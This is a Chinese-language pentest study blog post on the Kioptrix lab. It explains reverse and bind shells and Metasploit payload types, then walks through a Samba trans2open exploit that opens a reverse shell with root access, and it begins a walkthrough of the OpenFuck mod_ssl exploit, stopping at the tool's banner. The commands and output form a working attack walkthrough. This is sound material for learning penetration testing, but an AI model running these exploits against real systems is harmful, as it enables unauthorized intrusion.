<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Exploitation Basics | HackThe4O4</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Exploitation BasicsReverse Shells vs Bind Shells參考文章:https:&#x2F;&#x2F;ithelp.ithome.com.tw&#x2F;articles&#x2F;10279849?sc&#x3D;hot  所有的shell都是對機器的訪問 彈出shell -&gt; 可以訪問一台機器 reverse shell &gt; 受害者連接到攻擊機器     nc &gt; 監聽一個端口 lvp">
<meta property="og:type" content="article">
<meta property="og:title" content="Exploitation Basics">
<meta property="og:url" content="https://no-flag.com/2024/12/21/Exploitation%20Basics/index.html">
<meta property="og:site_name" content="HackThe4O4">
<meta property="og:description" content="Exploitation BasicsReverse Shells vs Bind Shells參考文章:https:&#x2F;&#x2F;ithelp.ithome.com.tw&#x2F;articles&#x2F;10279849?sc&#x3D;hot  所有的shell都是對機器的訪問 彈出shell -&gt; 可以訪問一台機器 reverse shell &gt; 受害者連接到攻擊機器     nc &gt; 監聽一個端口 lvp">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://no-flag.com/2024/12/21/Exploitation%20Basics/img/exploit_Untitled.png">
<meta property="og:image" content="https://no-flag.com/2024/12/21/Exploitation%20Basics/img/exploit_Untitled_1.png">
<meta property="og:image" content="https://no-flag.com/2024/12/21/Exploitation%20Basics/img/exploit_Untitled_2.png">
<meta property="og:image" content="https://no-flag.com/2024/12/21/Exploitation%20Basics/img/exploit_Untitled_3.png">
<meta property="og:image" content="https://no-flag.com/2024/12/21/Exploitation%20Basics/img/exploit_Untitled_4.png">
<meta property="og:image" content="https://no-flag.com/2024/12/21/Exploitation%20Basics/img/exploit_Untitled_5.png">
<meta property="og:image" content="https://no-flag.com/2024/12/21/Exploitation%20Basics/img/exploit_Untitled_6.png">
<meta property="og:image" content="https://no-flag.com/2024/12/21/Exploitation%20Basics/img/exploit_Untitled_7.png">
<meta property="og:image" content="https://no-flag.com/2024/12/21/Exploitation%20Basics/img/exploit_Untitled_8.png">
<meta property="og:image" content="https://no-flag.com/2024/12/21/Exploitation%20Basics/img/exploit_Untitled_9.png">
<meta property="og:image" content="https://no-flag.com/2024/12/21/Exploitation%20Basics/img/exploit_Untitled_10.png">
<meta property="og:image" content="https://no-flag.com/2024/12/21/Exploitation%20Basics/img/exploit_Untitled_11.png">
<meta property="og:image" content="https://no-flag.com/2024/12/21/Exploitation%20Basics/img/exploit_Untitled_12.png">
<meta property="og:image" content="https://no-flag.com/2024/12/21/Exploitation%20Basics/img/exploit_Untitled_13.png">
<meta property="og:image" content="https://no-flag.com/2024/12/21/Exploitation%20Basics/img/exploit_Untitled_14.png">
<meta property="og:image" content="https://no-flag.com/2024/12/21/Exploitation%20Basics/img/exploit_Untitled_15.png">
<meta property="article:published_time" content="2024-12-21T12:32:07.082Z">
<meta property="article:modified_time" content="2024-03-04T10:57:53.030Z">
<meta property="article:author" content="Noflag">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://no-flag.com/2024/12/21/Exploitation%20Basics/img/exploit_Untitled.png">
  
    <link rel="alternative" href="/atom.xml" title="HackThe4O4" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/cat.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  


<meta name="generator" content="Hexo 7.3.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="/img/mela.gif" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/2024/12/21/hello-world/">About Me</a></li>
				        
							<li><a href="/archives">All articles</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="/img/mela.gif" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/2024/12/21/hello-world/">About Me</a></li>
		        
					<li><a href="/archives">All articles</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap"><article id="exploit-Exploitation Basics" class="article article-type-exploit" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Exploitation%20Basics/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.082Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Exploitation Basics
      
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
        

        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Exploitation-Basics"><a href="#Exploitation-Basics" class="headerlink" title="Exploitation Basics"></a>Exploitation Basics</h1><h3 id="Reverse-Shells-vs-Bind-Shells"><a href="#Reverse-Shells-vs-Bind-Shells" class="headerlink" title="Reverse Shells vs Bind Shells"></a>Reverse Shells vs Bind Shells</h3><p>參考文章:<a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10279849?sc=hot">https://ithelp.ithome.com.tw/articles/10279849?sc=hot</a></p>
<ul>
<li>所有的shell都是對機器的訪問</li>
<li>彈出shell -&gt; 可以訪問一台機器</li>
<li><p>reverse shell &gt; 受害者連接到攻擊機器</p>
<p>  <img src="img/exploit_Untitled.png" alt="Untitled"></p>
<ul>
<li>nc &gt; 監聽一個端口<ul>
<li>lvp &gt; listening verbose part</li>
<li>電腦打開某端口</li>
</ul>
</li>
<li>在 /bin/sh 建立連線 &gt; 對象是 windows 是 cmd.exe</li>
<li>攻擊者(local)端監聽任何對4444 port的發起的連線</li>
<li>讓目標主機(受害者端)對攻擊者端的4444 port發起連線</li>
<li><p>雙方建立連線後</p>
<p><img src="img/exploit_Untitled_1.png" alt="Untitled"></p>
</li>
</ul>
</li>
<li><p>bind shell &gt; 在機器上打開一個端口連接到目標</p>
<p>  <img src="img/exploit_Untitled_2.png" alt="Untitled"></p>
<ul>
<li>當使用nc在特定端口上連接到特定目標機器時，對方會監聽攻擊機器的連接</li>
<li>綁定到目標(受害者)主機上的<strong>特定</strong>port來監聽傳入連接的shell，攻擊者會通過這port連到目標(受害)機器上</li>
<li>先使用nc 將 /bin/sh 綁定受害機器上的4444port</li>
<li>攻擊者在通過這個port連回受害機器</li>
</ul>
</li>
<li>Reverse shell是從受害<strong>主機對攻擊者主機</strong>發起連線 &gt; 受害者連接到攻擊機</li>
<li>Bind Shell是先在受害主機上綁定特定port，然後等來自<strong>攻擊者主機對受害主機</strong>發起連線，就像後門(backdoor)一樣 &gt; 攻擊者可以連接到受害者</li>
</ul>
<h3 id="Staged-vs-Non-Staged-Payloads"><a href="#Staged-vs-Non-Staged-Payloads" class="headerlink" title="Staged vs Non-Staged Payloads"></a><strong>Staged vs Non-Staged Payloads</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> 	        Staged vs Non-Staged Payloads</span><br><span class="line">                              |</span><br><span class="line">          -----------------------------------</span><br><span class="line">          |                                 |</span><br><span class="line">    Staged Payloads                    Non-Staged Payloads</span><br><span class="line">  |                   |            |                       |</span><br><span class="line">Meterpreter         Shell       Reverse TCP              Bind TCP</span><br><span class="line">  |                   |            |                       |</span><br><span class="line">Multiple Stages      Single     Two-Part Payload        Single-Part Payload</span><br><span class="line">  |                   |            |                       |</span><br><span class="line">Smaller Size     Easier to use    Versatile            Larger Size</span><br></pre></td></tr></table></figure>
<p>根據內容使用不同類型的payload</p>
<p>exploit是利用漏洞的程式碼，而payload可以造成損害</p>
<p>有些payload是我們用來發送給受害者並嘗試在機器上獲取shell的內容</p>
<ul>
<li><p>Non-staged</p>
<ul>
<li>Sends exploit shellcode all at once</li>
<li>Larger in size and won’t always work</li>
<li>Example: windows/meterpreter_reverse_tcp</li>
<li>此Payload被完整地發送，包括漏洞利用</li>
<li>隨著利用的運行而整體全部發送出去</li>
<li>Payload包括了所選任務的利用和全部shell程式碼</li>
<li>一體化的負荷更加穩定</li>
<li>這些Payload比其它類型Payload更大</li>
</ul>
</li>
<li><p>Staged</p>
<ul>
<li>Sends payload in stages</li>
<li>Can be less stable</li>
<li>Example: windows/meterpreter/reverse_tcp</li>
<li>指令中meterpreter後面有一個「<strong>/</strong>」字符，象徵一個<strong>Staged</strong> Payload</li>
<li>通常會被分成兩部分被發送</li>
<li>第一個部分包含一個小的Payload，用來使受害機器回連攻擊者</li>
<li>然後再傳輸第二個更大的Payload，這包含了剩餘的shellcode，然後整個Payload才能被執行</li>
<li>這類載Payload可用於有大小限制的環境或是規避檢測</li>
<li>透過網路載入這些元件會產生相當大的流量，並可能提醒防禦機制</li>
<li><code>可以幫助規避防毒軟體</code></li>
</ul>
</li>
<li>正<strong>斜線</strong>“ <strong>/</strong> ”字元用於區分Non-staged Payload和Staged Payload。</li>
<li>Metasploit 框架將漏洞利用與成功利用後執行的內容（有效負載）分開</li>
<li><p>Metasploit框架中的有效負載也分為兩部分，stager和stage。</p>
<ul>
<li><p>stager 負責下載大的有效負載（階段），將其註入內存，並將執行傳遞給它</p>
<p><img src="img/exploit_Untitled_3.png" alt="Untitled"></p>
</li>
</ul>
</li>
<li><p>許多可利用的情況限制了攻擊者可以在不改變的情況下將多少位元組載入到記憶體中的一個連續位置</p>
</li>
<li>這些情況下進行有趣的後期利用的一種方法是分階段交付Payload</li>
<li>Stagers 通常是用手工優化的彙編語言編寫的。攻擊者的目標是使 stager 盡可能小</li>
<li>小型 stager 使攻擊者可以自由地使用它進行更多攻擊</li>
</ul>
<h3 id="Gaining-Root-with-Metasploit"><a href="#Gaining-Root-with-Metasploit" class="headerlink" title="Gaining Root with Metasploit"></a><strong>Gaining Root with Metasploit</strong></h3><p>根據之前的掃描結果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] 192.168.19.140:139    -   Host could not be identified: Unix (**Samba 2.2.1a**)</span><br></pre></td></tr></table></figure>
<p>利用searchploit尋找發現的服務版本漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# searchsploit samba 2.2    </span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                               |  Path</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Samba 2.0.x/2.2 - Arbitrary File Creation                                    | unix/remote/20968.txt</span><br><span class="line">Samba 2.2.0 &lt; 2.2.8 (OSX) - trans2open Overflow (Metasploit)                 | osx/remote/9924.rb</span><br><span class="line">Samba 2.2.2 &lt; 2.2.6 - <span class="string">&#x27;nttrans&#x27;</span> Remote Buffer Overflow (Metasploit) (1)      | linux/remote/16321.rb</span><br><span class="line">Samba 2.2.8 (BSD x86) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)            | bsd_x86/remote/16880.rb</span><br><span class="line">****Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalat | linux/local/23674.txt</span><br><span class="line">Samba 2.2.8 (Linux x86) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)          | linux_x86/remote/16861.rb</span><br><span class="line">Samba 2.2.8 (OSX/PPC) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)            | osx_ppc/remote/16876.rb</span><br><span class="line">Samba 2.2.8 (Solaris SPARC) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)      | solaris_sparc/remote/16330.rb</span><br><span class="line">Samba 2.2.8 - Brute Force Method Remote Command Execution                    | linux/remote/55.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (1)                   | unix/remote/22468.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (2)                   | unix/remote/22469.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (3)                   | unix/remote/22470.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (4)                   | unix/remote/22471.txt</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;nttrans&#x27;</span> Remote Overflow (Metasploit)                         | linux/remote/9936.rb</span><br><span class="line">Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow      | unix/remote/22356.c</span><br><span class="line">Samba 2.2.x - Remote Buffer Overflow                                         | linux/remote/7.pl</span><br><span class="line">Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution                            | multiple/remote/10.c</span><br><span class="line">Samba &lt; 3.0.20 - Remote Heap Overflow                                        | linux/remote/7701.txt</span><br><span class="line">Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                | linux_x86/dos/36741.py</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
<p>開啟msf利用該漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search samba 2.2</span><br><span class="line">                                                                                                               </span><br><span class="line">Matching Modules                                                                                               </span><br><span class="line">================                                                                                               </span><br><span class="line">                                                                                                               </span><br><span class="line">   <span class="comment">#  Name                              Disclosure Date  Rank     Check  Description                           </span></span><br><span class="line">   -  ----                              ---------------  ----     -----  -----------                                          </span><br><span class="line">   0  exploit/multi/samba/nttrans       2003-04-07       average  No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow</span><br><span class="line">   1  exploit/freebsd/samba/trans2open  2003-04-07       great    No     Samba trans2open Overflow (*BSD x86)</span><br><span class="line">   **2  exploit/linux/samba/trans2open    2003-04-07       great    No     Samba trans2open Overflow (Linux x86)**</span><br><span class="line">   3  exploit/osx/samba/trans2open      2003-04-07       great    No     Samba trans2open Overflow (Mac OS X PPC)</span><br><span class="line">   4  exploit/solaris/samba/trans2open  2003-04-07       great    No     Samba trans2open Overflow (Solaris SPARC)</span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 4, use 4 or use exploit/solaris/samba/trans2open</span><br><span class="line"></span><br><span class="line">msf6 &gt; use exploit/linux/samba/trans2open</span><br><span class="line">[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/trans2open):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   **RHOSTS                   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using**</span><br><span class="line">                                      -metasploit.html</span><br><span class="line">   RPORT   139              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload options (linux/x86/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Samba 2.2.x - Bruteforce</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; <span class="built_in">set</span> RHOSTS 192.168.19.140</span><br><span class="line">RHOSTS =&gt; 192.168.19.140</span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.19.130:4444 </span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffdfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffcfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffbfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffafc...</span><br><span class="line">[*] Sending stage (1017704 bytes) to 192.168.19.140</span><br><span class="line">[*] 192.168.19.140 - Meterpreter session 5 closed.  Reason: Died</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff9fc...</span><br><span class="line">[*] Sending stage (1017704 bytes) to 192.168.19.140</span><br><span class="line">[*] 192.168.19.140 - Meterpreter session 6 closed.  Reason: Died</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff8fc...</span><br><span class="line">[*] Sending stage (1017704 bytes) to 192.168.19.140</span><br><span class="line">[*] 192.168.19.140 - Meterpreter session 7 closed.  Reason: Died</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff7fc...</span><br><span class="line">[*] Sending stage (1017704 bytes) to 192.168.19.140</span><br><span class="line">[*] 192.168.19.140 - Meterpreter session 8 closed.  Reason: Died</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff6fc...</span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<ul>
<li><p>解決run運行問題</p>
<p>  有時候kali在運行run後會出現</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[-] 192.168.19.140:139 - **Exploit failed: undefined method `each_module**<span class="string">&#x27; for [[&quot;x86/single_byte&quot;, Msf::Modules::Nop__X86__Single_byte::MetasploitModule], [&quot;x86/opty2&quot;, Msf::Modules::Nop__X86__Opty2::MetasploitModule]]:Array</span></span><br><span class="line"><span class="string">Did you mean?  each_slice</span></span><br><span class="line"><span class="string">[*] Exploit completed, but no session was created.</span></span><br></pre></td></tr></table></figure>
<p>  這樣的錯誤問題有可能是源碼中使用each_module，但我在查看該rb檔案後沒發現有這行</p>
<p>  <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/pull/18828/files">https://github.com/rapid7/metasploit-framework/pull/18828/files</a></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(X) nops.each_module &#123; |nopname, nopmod|</span><br><span class="line">(O) nops.each &#123; |nopname, nopmod|</span><br></pre></td></tr></table></figure>
<p>  後來決定更新看看msf</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **apt update; apt install metasploit-framework**</span><br></pre></td></tr></table></figure>
<p>  再次重開啟會看到msf沒報錯了</p>
</li>
</ul>
<p>但從運行結果看到 <code>Meterpreter session X closed.  Reason: Died</code> </p>
<p>這有可能是Payload的問題，可以換一個試試</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(linux/samba/trans2open) &gt; **options** </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/trans2open):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS  192.168.19.140   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using</span><br><span class="line">                                      -metasploit.html</span><br><span class="line">   RPORT   139              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload options (linux/x86/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Samba 2.2.x - Bruteforce</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; **<span class="built_in">set</span> payload** </span><br><span class="line"><span class="built_in">set</span> payload generic/custom                            <span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload generic/debug_trap                        <span class="built_in">set</span> payload linux/x86/metsvc_bind_tcp</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_bind_aws_ssm                <span class="built_in">set</span> payload linux/x86/metsvc_reverse_tcp</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_bind_tcp                    <span class="built_in">set</span> payload linux/x86/read_file</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_reverse_tcp                 <span class="built_in">set</span> payload linux/x86/shell/bind_ipv6_tcp</span><br><span class="line"><span class="built_in">set</span> payload generic/ssh/interact                      <span class="built_in">set</span> payload linux/x86/shell/bind_ipv6_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload generic/tight_loop                        <span class="built_in">set</span> payload linux/x86/shell/bind_nonx_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/adduser                         <span class="built_in">set</span> payload linux/x86/shell/bind_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/chmod                           <span class="built_in">set</span> payload linux/x86/shell/bind_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/exec                            <span class="built_in">set</span> payload linux/x86/shell/reverse_ipv6_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_ipv6_tcp       <span class="built_in">set</span> payload linux/x86/shell/reverse_nonx_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_ipv6_tcp_uuid  <span class="built_in">set</span> payload linux/x86/shell/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_nonx_tcp       <span class="built_in">set</span> payload linux/x86/shell/reverse_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_tcp            <span class="built_in">set</span> payload linux/x86/shell_bind_ipv6_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_tcp_uuid       <span class="built_in">set</span> payload linux/x86/shell_bind_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_ipv6_tcp    <span class="built_in">set</span> payload linux/x86/shell_bind_tcp_random_port</span><br><span class="line">**<span class="built_in">set</span> payload linux/x86/meterpreter/reverse_nonx_tcp    <span class="built_in">set</span> payload linux/x86/shell_reverse_tcp**</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp         <span class="built_in">set</span> payload linux/x86/shell_reverse_tcp_ipv6</span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; **<span class="built_in">set</span> payload linux/x86/shell_reverse_tcp**</span><br><span class="line">payload =&gt; linux/x86/shell_reverse_tcp</span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; **options**</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/trans2open):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS  192.168.19.140   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using</span><br><span class="line">                                      -metasploit.html</span><br><span class="line">   RPORT   139              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line"></span><br><span class="line">**Payload options (linux/x86/shell_reverse_tcp):**</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   CMD    /bin/sh          <span class="built_in">yes</span>       The <span class="built_in">command</span> string to execute</span><br><span class="line">   LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Samba 2.2.x - Bruteforce</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br></pre></td></tr></table></figure>
<p>確認更換好payload後執行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(linux/samba/trans2open) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.19.130:4444 </span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffdfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffcfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffbfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffafc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff9fc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff8fc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff7fc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff6fc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff5fc...</span><br><span class="line">[*] Command shell session 9 opened (192.168.19.130:4444 -&gt; 192.168.19.140:32777) at 2024-02-14 14:59:48 -0500</span><br><span class="line"></span><br><span class="line">[*] Command shell session 10 opened (192.168.19.130:4444 -&gt; 192.168.19.140:32778) at 2024-02-14 14:59:49 -0500</span><br><span class="line">[*] Command shell session 11 opened (192.168.19.130:4444 -&gt; 192.168.19.140:32779) at 2024-02-14 14:59:50 -0500</span><br><span class="line">[*] Command shell session 12 opened (192.168.19.130:4444 -&gt; 192.168.19.140:32780) at 2024-02-14 14:59:51 -0500</span><br><span class="line"></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">hostname</span><br><span class="line">kioptrix.level1</span><br><span class="line"><span class="built_in">cat</span> /proc/version</span><br><span class="line">**Linux version 2.4.7-10** (bhcompile@stripples.devel.redhat.com) (gcc version 2.96 20000731 (Red Hat Linux 7.1 2.96-98)) <span class="comment">#1 Thu Sep 6 16:46:36 EDT 2001</span></span><br></pre></td></tr></table></figure>
<p>成功利用版本漏洞進行RCE，同時知道了目標系統是Red Hat Linux 7.1 2.96-98</p>
<p>查看linux版本方法</p>
<ul>
<li>lsb_release -a</li>
<li>cat /etc/issue</li>
<li>cat /proc/version</li>
</ul>
<h3 id="Manual-Exploitation"><a href="#Manual-Exploitation" class="headerlink" title="Manual Exploitation"></a><strong>Manual Exploitation</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">+** Red Hat Linux 7.1 2.96-98</span><br></pre></td></tr></table></figure>
<p>根據前面找到的資訊進一步利用</p>
<p>apache mod_ssl 該版本有可利用的漏洞，下載OpenFuck進行利用，根據版本選擇OffSet</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt]</span><br><span class="line">└─# git <span class="built_in">clone</span> https://github.com/heltonWernik/OpenFuck.git</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt]</span><br><span class="line">└─# <span class="built_in">cd</span> OpenFuck </span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# <span class="built_in">ls</span></span><br><span class="line">OpenFuck.c  README.md</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# apt-get install libssl-dev</span><br><span class="line"></span><br><span class="line">                                                                                                                      </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# gcc -o OpenFuck OpenFuck.c -lcrypto</span><br><span class="line"></span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# <span class="built_in">ls</span></span><br><span class="line">OpenFuck  OpenFuck.c  README.md</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# ./OpenFuck</span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line">*******************************************************************</span><br><span class="line">* 